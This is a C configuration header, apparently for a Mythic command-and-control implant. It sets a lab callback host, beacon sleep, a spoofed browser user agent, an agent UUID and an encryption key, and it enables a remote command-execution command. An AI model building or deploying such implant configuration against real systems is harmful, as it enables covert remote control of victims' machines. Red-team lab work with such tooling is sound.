#ifndef CONFIG_H
#define CONFIG_H

// #define PIC_BUILD
#define PROFILE_MYTHIC_HTTP
#define CONFIG_SLEEP 3
#define CONFIG_SLEEP_JITTER 0
#define CONFIG_HOST L"192.168.56.110"
#define CONFIG_UA L"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
#define CONFIG_POST_URI L"/data"
#define CONFIG_UUID "39ae2f4a-743d-43aa-9e0b-cd90e4aa8870"
#define CONFIG_ENCRYPT_KEY { 0x43, 0x88, 0x3a, 0xf8, 0x1a, 0x35, 0x9a, 0x1f, 0xaf, 0x9f, 0xd0, 0xe2, 0x76, 0x30, 0xb6, 0x45, 0x1a, 0xf6, 0x85, 0x3e, 0xea, 0xf0, 0xde, 0x50, 0x52, 0x56, 0xcb, 0x80, 0xc8, 0x15, 0xd5, 0xff }
#define REQUIRE_DLL_NTDLL
#define REQUIRE_DLL_KERNEL32
#define REQUIRE_DLL_WININET
#define REQUIRE_DLL_IPHLPAPI
#define REQUIRE_DLL_ADVAPI32
#define REQUIRE_DLL_WS2_32
#define REQUIRE_DLL_BCRYPT
#define INCLUDE_CMD_EXECUTE
// #define INCLUDE_CMD_IPINFO
// #define INCLUDE_CMD_MV
// #define INCLUDE_CMD_MKDIR
// #define INCLUDE_CMD_EXIT
// #define INCLUDE_CMD_CP
// #define INCLUDE_CMD_LS
// #define INCLUDE_CMD_RM
// #define INCLUDE_CMD_PWD
// #define INCLUDE_CMD_SLEEP
// #define INCLUDE_CMD_UPLOAD
// #define INCLUDE_CMD_WHOAMI
// #define INCLUDE_CMD_AGENTINFO
// #define INCLUDE_CMD_CD
// #define INCLUDE_CMD_DOWNLOAD
// #define INCLUDE_CMD_LISTDRIVES
// #define INCLUDE_CMD_HOSTNAME
// #define INCLUDE_CMD_PS
// #define INCLUDE_CMD_EXECUTE_HBIN

#endif
